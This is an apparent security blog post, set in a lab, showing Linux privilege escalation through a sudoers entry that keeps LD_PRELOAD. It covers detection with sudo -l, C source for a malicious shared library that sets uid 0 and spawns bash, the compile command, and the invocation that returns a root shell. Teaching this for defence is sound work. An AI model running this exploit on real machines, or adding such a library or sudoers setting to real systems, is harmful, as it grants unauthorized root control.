---
layout: post
title: Privilege Escalation - SUDO - LD_PRELOAD
date: 2021-02-08 14:39:00
categories: posts
comments: false
en: true
---

##### Preamble

LD_PRELOAD is an enviromental variable, commonly used within C programming. This variable is implemented in order to load any library prior to any other form of shared library.
Nonetheless, if this is run under high privileges, and the variable is hijacked into a malicious file, a Privilege Escalation vector shall be found.

##### Creating the scenario.

In order to use LD_PRELOAD within sudo, we must configure /etc/sudoers:

```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
```
```term
Defaults        env_reset, env_keep+=LD_PRELOAD
```
```
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL
```
```term
pipe    ALL=NOPASSWD:/usr/bin/ping
```
```
# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
```

If you glance at the file, you may see that the first highlighted line sets the flag for ```LD_PRELOAD```. In addition, the user ```pipe``` is given the privilege of 
executing ```SUDO``` in ```/usr/bin/ping```. However, ping is useless when it comes to ```SUDO``` exploitation, therefore, ```LD_PRELOAD``` is the only possible vector.

##### Detection

Detecting this vulnerability is quite simple.

```term
pipe@whitecr0wz:/tmp$ sudo -l
Matching Defaults entries for pipe on whitecr0wz:
    env_reset, env_keep+=LD_PRELOAD, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pipe may run the following commands on whitecr0wz:
    (root) NOPASSWD: /usr/bin/ping
pipe@whitecr0wz:/tmp$
```

Take a glance at the flag ```env_keep+=LD_PRELOAD```, this means that we can set ```LD_PRELOAD```.

##### Exploitation

In order to exploit this vector, we require a binary that uses the value given in the ```LD_PRELOAD``` variable. A great example of such should be the following.

```term
pipe@whitecr0wz:/tmp$ cat rootshell.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
pipe@whitecr0wz:/tmp$
```

This is compiled.

```term
pipe@whitecr0wz:/tmp$ gcc rootshell.c -o rootshell -fPIC -shared -nostartfiles -w 
pipe@whitecr0wz:/tmp$
```

#### Profit

```term
pipe@whitecr0wz:/tmp$ sudo LD_PRELOAD=/tmp/rootshell ping 
root@whitecr0wz:/tmp#
```
